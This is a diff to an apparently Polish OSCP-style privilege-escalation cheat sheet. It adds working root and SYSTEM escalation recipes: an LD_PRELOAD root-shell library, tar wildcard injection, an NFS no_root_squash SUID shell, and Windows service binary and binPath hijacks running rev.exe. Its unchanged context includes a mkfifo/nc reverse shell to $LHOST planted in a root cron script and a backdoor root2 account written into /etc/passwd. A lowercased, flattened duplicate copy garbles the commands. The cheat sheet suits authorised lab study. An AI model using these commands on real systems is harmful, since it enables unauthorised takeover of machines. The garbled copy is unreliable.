@@ -1227,12 +1227,26 @@ export path=/tmp:$path          # twoje /tmp ma pierwszenstwo w wyszukiwaniu
 ./suidbin                       # root wykona twoja &lt;wolana_komenda&gt;
 /tmp/rootbash -p                # -p = zachowaj euid=0 -&gt; interaktywny root shell (nie -c)
 id                             # euid=0(root) wariant: gdy suid woła komendę **z pełną ścieżką**, path hijack odpada → sprawdź samą komendę w gtfobins, argumenty wstrzykiwane z twojego inputu, albo `ld_preload`/`ld_library_path` (gdy `sudo` z `env_keep`, bo zwykłe suid czyści env). sudo sudo -l                                                # co user może uruchomić jako root/inny przykład: `(all) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get` → sprawdź każdy w gtfobins (&quot;sudo&quot;). ⚠️ uważaj na apparmor — komenda z sudo może być blokowana profilem: cat /var/log/syslog | grep tcpdump                     # szukaj apparmor=&quot;denied&quot;
-su - root; aa-status                                   # co apparmor chroni sudo bez hasła + `ld_preload`/`env_keep`, stare cve (baron samedit `sudo -v`), itp. — patrz gtfobins. capabilities uprawnienia nadawane binarkom bez pełnego suid. `cap_setuid+ep` = można zostać rootem. /usr/sbin/getcap -r / 2&gt;/dev/null /usr/bin/perl = cap_setuid+ep          &lt;- jackpot perl -e &#x27;use posix qw(setuid); posix::setuid(0); exec &quot;/bin/sh&quot;;&#x27; cron jobs z błędnymi uprawnieniami grep &quot;cron&quot; /var/log/syslog
+su - root; aa-status                                   # co apparmor chroni **sudo + ld_preload** — gdy `sudo -l` pokazuje `env_keep+=ld_preload` (env przenoszony do sudo): cat &gt; /tmp/pre.c &lt;&lt;&#x27;eof&#x27;
+#include &lt;stdlib.h&gt;
+void _init(){ unsetenv(&quot;ld_preload&quot;); setgid(0); setuid(0); system(&quot;/bin/bash&quot;); }
+eof
+gcc -fpic -shared -o /tmp/pre.so /tmp/pre.c -nostartfiles
+sudo ld_preload=/tmp/pre.so &lt;dowolna_dozwolona_komenda&gt;   # np. sudo ld_preload=/tmp/pre.so apache2 -&gt; root stare cve gdy nic z gtfobins: **baron samedit** (cve-2021-3156, sudo &lt; 1.9.5p2 — sprawdź `sudo -v`), sudo &lt; 1.8.28 (`sudo -u#-1`). zawsze też gtfobins („sudo&quot;). capabilities uprawnienia nadawane binarkom bez pełnego suid. `cap_setuid+ep` = można zostać rootem. /usr/sbin/getcap -r / 2&gt;/dev/null /usr/bin/perl = cap_setuid+ep          &lt;- jackpot perl -e &#x27;use posix qw(setuid); posix::setuid(0); exec &quot;/bin/sh&quot;;&#x27; cron jobs z błędnymi uprawnieniami grep &quot;cron&quot; /var/log/syslog
 ls -lah /etc/cron*
 cat /etc/crontab znajdź katalogi/pliki zapisywalne przez usera: find / -writable -type d 2&gt;/dev/null                   # zapisywalne katalogi
 find / -writable -type f 2&gt;/dev/null | grep -v /proc    # zapisywalne pliki zapisywalny skrypt uruchamiany przez root-cron → **dopisz** (nie nadpisuj!) reverse shell: ls -lah /home/joe/.scripts/user_backups.sh             # -rwxrwxrw- = każdy pisze
 echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc $lhost 1234 &gt;/tmp/f&quot; &gt;&gt; user_backups.sh
-nc -lnvp 1234                                           # czekaj do minuty na strzał crona → potwierdź id (uid=0) dopisuj przez `&gt;&gt;`, żeby legalny backup dalej działał. cleanup: usuń dopisaną linię i `/tmp/f`. zapisywalny /etc/passwd (nadpisanie hasła root) jeśli hash jest w 2. kolumnie /etc/passwd, ma pierwszeństwo przed /etc/shadow. openssl passwd w00t                                    # wygeneruj hash crypt
+nc -lnvp 1234                                           # czekaj do minuty na strzał crona → potwierdź id (uid=0) dopisuj przez `&gt;&gt;`, żeby legalny backup dalej działał. cleanup: usuń dopisaną linię i `/tmp/f`. **cron + wildcard injection** — gdy root-cron woła `tar`/`chown`/`rsync` z `*` w zapisywalnym katalogu, podłóż pliki-argumenty (nazwa pliku = flaga): # przyklad root-crona:  cd /opt/backups &amp;&amp; tar czf /backup.tgz *
+cd /opt/backups                                        # katalog z wildcardem, gdzie mozesz pisac
+echo &#x27;cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash&#x27; &gt; runme.sh
+touch -- &#x27;--checkpoint=1&#x27;                               # tar potraktuje te nazwy jak swoje flagi
+touch -- &#x27;--checkpoint-action=exec=sh runme.sh&#x27;
+# po najblizszym uruchomieniu crona:  /tmp/rootbash -p   (euid=0) analogiczne wildcard-triki mają `chown`/`chmod`/`rsync`/`7z` — gtfobins → dana komenda, sekcja „wildcard&quot;. klucz: **zapisywalny katalog + goły `*` w komendzie roota**. nfs no_root_squash (montujesz udział → tworzysz suid jako root) eksport z flagą `no_root_squash` = plik utworzony przez roota na twojej kali zachowuje **uid 0** na celu → dropujesz suid-owy shell. showmount -e $ip                                       # lista eksportow — szukaj (no_root_squash)
+mkdir /tmp/nfs &amp;&amp; sudo mount -o rw,vers=3 $ip:/eksport /tmp/nfs   # na kali, jako root
+sudo cp /bin/bash /tmp/nfs/rootbash &amp;&amp; sudo chmod 4755 /tmp/nfs/rootbash   # suid-root na udziale
+# teraz na celu (jako zwykly user), w zamontowanym katalogu:
+/sciezka/eksportu/rootbash -p                          # euid=0 -&gt; root shell zapisywalny /etc/passwd (nadpisanie hasła root) jeśli hash jest w 2. kolumnie /etc/passwd, ma pierwszeństwo przed /etc/shadow. openssl passwd w00t                                    # wygeneruj hash crypt
 echo &quot;root2:fdzt.eqjq4s0g:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd
 su root2                                               # hasło: w00t zbieranie poświadczeń lokalnie (hidden in plain view) najszybsza droga do roota bywa przez podsłuchane/zapisane hasło (`su` z wyciekiem). enum systemu → patrz §3.1. env; cat ~/.bashrc ~/.bash_history 2&gt;/dev/null         # eksporty typu script_credentials=...
 watch -n 1 &quot;ps -aux | grep pass&quot;                       # łap krótkie procesy z hasłem w linii poleceń (sshpass -p...)
@@ -1276,7 +1290,14 @@ id                             # euid=0(root)</code></pre></div>
 <blockquote>⚠️ Uważaj na AppArmor — komenda z sudo może być blokowana profilem:</blockquote>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>cat /var/log/syslog | grep tcpdump                     # szukaj apparmor=&quot;DENIED&quot;
 su - root; aa-status                                   # co AppArmor chroni</code></pre></div>
-<p>Sudo bez hasła + <code>LD_PRELOAD</code>/<code>env_keep</code>, stare CVE (Baron Samedit <code>sudo -V</code>), itp. — patrz GTFOBins.</p>
+<p><strong>Sudo + LD_PRELOAD</strong> — gdy <code>sudo -l</code> pokazuje <code>env_keep+=LD_PRELOAD</code> (env przenoszony do sudo):</p>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>cat &gt; /tmp/pre.c &lt;&lt;&#x27;EOF&#x27;
+#include &lt;stdlib.h&gt;
+void _init(){ unsetenv(&quot;LD_PRELOAD&quot;); setgid(0); setuid(0); system(&quot;/bin/bash&quot;); }
+EOF
+gcc -fPIC -shared -o /tmp/pre.so /tmp/pre.c -nostartfiles
+sudo LD_PRELOAD=/tmp/pre.so &lt;dowolna_dozwolona_komenda&gt;   # np. sudo LD_PRELOAD=/tmp/pre.so apache2 -&gt; root</code></pre></div>
+<blockquote>Stare CVE gdy nic z GTFOBins: <strong>Baron Samedit</strong> (CVE-2021-3156, sudo &lt; 1.9.5p2 — sprawdź <code>sudo -V</code>), sudo &lt; 1.8.28 (<code>sudo -u#-1</code>). Zawsze też GTFOBins („Sudo&quot;).</blockquote>
 <h4 class="leaf">Capabilities</h4>
 <blockquote>Uprawnienia nadawane binarkom bez pełnego SUID. <code>cap_setuid+ep</code> = można zostać rootem.</blockquote>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>/usr/sbin/getcap -r / 2&gt;/dev/null</code></pre></div>
@@ -1294,6 +1315,21 @@ find / -writable -type f 2&gt;/dev/null | grep -v /proc    # zapisywalne pliki</
 echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc $LHOST 1234 &gt;/tmp/f&quot; &gt;&gt; user_backups.sh
 nc -lnvp 1234                                           # czekaj do minuty na strzał crona → potwierdź id (uid=0)</code></pre></div>
 <blockquote>Dopisuj przez <code>&gt;&gt;</code>, żeby legalny backup dalej działał. Cleanup: usuń dopisaną linię i <code>/tmp/f</code>.</blockquote>
+<p><strong>Cron + wildcard injection</strong> — gdy root-cron woła <code>tar</code>/<code>chown</code>/<code>rsync</code> z <code>*</code> w zapisywalnym katalogu, podłóż pliki-argumenty (nazwa pliku = flaga):</p>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code># przyklad root-crona:  cd /opt/backups &amp;&amp; tar czf /backup.tgz *
+cd /opt/backups                                        # katalog z wildcardem, gdzie MOZESZ pisac
+echo &#x27;cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash&#x27; &gt; runme.sh
+touch -- &#x27;--checkpoint=1&#x27;                               # tar potraktuje te nazwy jak swoje flagi
+touch -- &#x27;--checkpoint-action=exec=sh runme.sh&#x27;
+# po najblizszym uruchomieniu crona:  /tmp/rootbash -p   (euid=0)</code></pre></div>
+<blockquote>Analogiczne wildcard-triki mają <code>chown</code>/<code>chmod</code>/<code>rsync</code>/<code>7z</code> — GTFOBins → dana komenda, sekcja „Wildcard&quot;. Klucz: <strong>zapisywalny katalog + goły <code>*</code> w komendzie roota</strong>.</blockquote>
+<h4 class="leaf">NFS no_root_squash (montujesz udział → tworzysz SUID jako root)</h4>
+<blockquote>Eksport z flagą <code>no_root_squash</code> = plik utworzony przez roota na Twojej Kali zachowuje <strong>UID 0</strong> na celu → dropujesz SUID-owy shell.</blockquote>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>showmount -e $ip                                       # lista eksportow — szukaj (no_root_squash)
+mkdir /tmp/nfs &amp;&amp; sudo mount -o rw,vers=3 $ip:/eksport /tmp/nfs   # na KALI, jako root
+sudo cp /bin/bash /tmp/nfs/rootbash &amp;&amp; sudo chmod 4755 /tmp/nfs/rootbash   # SUID-root na udziale
+# teraz na CELU (jako zwykly user), w zamontowanym katalogu:
+/sciezka/eksportu/rootbash -p                          # euid=0 -&gt; root shell</code></pre></div>
 <h4 class="leaf">Zapisywalny /etc/passwd (nadpisanie hasła root)</h4>
 <blockquote>Jeśli hash jest w 2. kolumnie /etc/passwd, ma pierwszeństwo przed /etc/shadow.</blockquote>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>openssl passwd w00t                                    # wygeneruj hash crypt
@@ -1332,7 +1368,15 @@ get-ciminstance -classname win32_service | select name,startmode | where-object 
 # sprawdź uprawnienia binarki usługi (czy możesz nadpisać):  icacls &quot;c:\path\service.exe&quot;
 # automat (powerup): znajdź i nadpisz podatną usługę jednym ruchem:
 #   import-module .\powerup.ps1 ; invoke-allchecks
-#   install-servicebinary -name &#x27;vulnsvc&#x27;      # podmienia binarkę → dodaje admina unquoted service paths ścieżka usługi bez cudzysłowów + spacja → windows próbuje uruchomić `c:\program.exe` itd. get-ciminstance -classname win32_service | select name,state,pathname wmic service get name,pathname | findstr /i /v &quot;c:\windows\\&quot; | findstr /i /v &quot;&quot;&quot; dll hijacking get-itemproperty &quot;hklm:\software\wow6432node\microsoft\windows\currentversion\uninstall\*&quot; | select displayname, installlocation użyj **process monitor** (filtr: result = name not found, path kończy się na .dll) żeby znaleźć dll ładowany z zapisywalnej ścieżki. registry — auto-logon i sekrety :: auto-logon credentials (sprawdź defaultpassword + autoadminlogon=1)
+#   install-servicebinary -name &#x27;vulnsvc&#x27;      # podmienia binarkę → dodaje admina **dwa warianty ręcznie:** :: a) mam zapis do binarki uslugi (icacls pokazal (m)/(f)) -&gt; podmien plik:
+copy /y rev.exe &quot;c:\path\service.exe&quot; &amp; sc stop &lt;svc&gt; &amp; sc start &lt;svc&gt;
+:: b) mam service_change_config na usludze (accesschk) -&gt; przekieruj binpath:
+accesschk.exe -uwcqv &quot;&lt;user&gt;&quot; &lt;svc&gt;                 :: szukaj service_change_config / service_all_access
+sc config &lt;svc&gt; binpath= &quot;c:\windows\temp\rev.exe&quot;  :: uwaga: spacja po &#x27;binpath=&#x27; jest wymagana!
+sc stop &lt;svc&gt; &amp; sc start &lt;svc&gt;                       :: zlap system na nc -lvnp jeśli usługi nie da się restartować, a ma `start= auto` — czasem trzeba reboot (`shutdown /r /t 0`, gdy masz seshutdown). unquoted service paths ścieżka usługi bez cudzysłowów + spacja → windows próbuje uruchomić `c:\program.exe` itd. get-ciminstance -classname win32_service | select name,state,pathname wmic service get name,pathname | findstr /i /v &quot;c:\windows\\&quot; | findstr /i /v &quot;&quot;&quot; **eksploatacja** — ścieżka `c:\program files\some dir\svc.exe` → windows próbuje po kolei `c:\program.exe`, `c:\program files\some.exe`. podłóż payload w pierwszym segmencie, gdzie masz zapis: icacls &quot;c:\program files&quot;                              :: szukasz (w)/(m)/(f) dla swojej grupy
+:: msfvenom service exe (§2.9); nazwa = segment przed spacja:
+copy rev.exe &quot;c:\program files\some.exe&quot;
+sc stop &lt;svc&gt; &amp; sc start &lt;svc&gt;                          :: lub restart hosta; zlap system na listenerze sprawdź też, czy w ogóle możesz restartować usługę: `sc qc &lt;svc&gt;` (start_type) + uprawnienia niżej. dll hijacking get-itemproperty &quot;hklm:\software\wow6432node\microsoft\windows\currentversion\uninstall\*&quot; | select displayname, installlocation użyj **process monitor** (filtr: result = name not found, path kończy się na .dll) żeby znaleźć dll ładowany z zapisywalnej ścieżki. registry — auto-logon i sekrety :: auto-logon credentials (sprawdź defaultpassword + autoadminlogon=1)
 reg query &quot;hklm\software\microsoft\windows nt\currentversion\winlogon&quot;
 reg query &quot;hklm\software\microsoft\windows nt\currentversion\winlogon&quot; /v defaultpassword
 :: zainstalowane apps
@@ -1375,10 +1419,24 @@ Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object 
 # Automat (PowerUp): znajdź i nadpisz podatną usługę jednym ruchem:
 #   Import-Module .\PowerUp.ps1 ; Invoke-AllChecks
 #   Install-ServiceBinary -Name &#x27;vulnsvc&#x27;      # podmienia binarkę → dodaje admina</code></pre></div>
+<p><strong>Dwa warianty ręcznie:</strong></p>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>:: A) mam zapis do BINARKI uslugi (icacls pokazal (M)/(F)) -&gt; podmien plik:
+copy /y rev.exe &quot;C:\Path\service.exe&quot; &amp; sc stop &lt;svc&gt; &amp; sc start &lt;svc&gt;
+:: B) mam SERVICE_CHANGE_CONFIG na usludze (accesschk) -&gt; przekieruj binPath:
+accesschk.exe -uwcqv &quot;&lt;user&gt;&quot; &lt;svc&gt;                 :: szukaj SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS
+sc config &lt;svc&gt; binPath= &quot;C:\Windows\Temp\rev.exe&quot;  :: UWAGA: spacja PO &#x27;binPath=&#x27; jest wymagana!
+sc stop &lt;svc&gt; &amp; sc start &lt;svc&gt;                       :: zlap SYSTEM na nc -lvnp</code></pre></div>
+<blockquote>Jeśli usługi nie da się restartować, a ma <code>START= auto</code> — czasem trzeba reboot (<code>shutdown /r /t 0</code>, gdy masz SeShutdown).</blockquote>
 <h4 class="leaf">Unquoted Service Paths</h4>
 <blockquote>Ścieżka usługi bez cudzysłowów + spacja → Windows próbuje uruchomić <code>C:\Program.exe</code> itd.</blockquote>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>Get-CimInstance -ClassName win32_service | Select Name,State,PathName</code></pre></div>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>wmic service get name,pathname | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</code></pre></div>
+<p><strong>Eksploatacja</strong> — ścieżka <code>C:\Program Files\Some Dir\svc.exe</code> → Windows próbuje po kolei <code>C:\Program.exe</code>, <code>C:\Program Files\Some.exe</code>. Podłóż payload w pierwszym segmencie, gdzie masz zapis:</p>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>icacls &quot;C:\Program Files&quot;                              :: szukasz (W)/(M)/(F) dla swojej grupy
+:: msfvenom service exe (§2.9); nazwa = segment PRZED spacja:
+copy rev.exe &quot;C:\Program Files\Some.exe&quot;
+sc stop &lt;svc&gt; &amp; sc start &lt;svc&gt;                          :: lub restart hosta; zlap SYSTEM na listenerze</code></pre></div>
+<blockquote>Sprawdź też, czy w ogóle możesz restartować usługę: <code>sc qc &lt;svc&gt;</code> (START_TYPE) + uprawnienia niżej.</blockquote>
 <h4 class="leaf">DLL Hijacking</h4>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>Get-ItemProperty &quot;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&quot; | select DisplayName, InstallLocation</code></pre></div>
 <blockquote>Użyj <strong>Process Monitor</strong> (filtr: Result = NAME NOT FOUND, Path kończy się na .dll) żeby znaleźć DLL ładowany z zapisywalnej ścieżki.</blockquote>
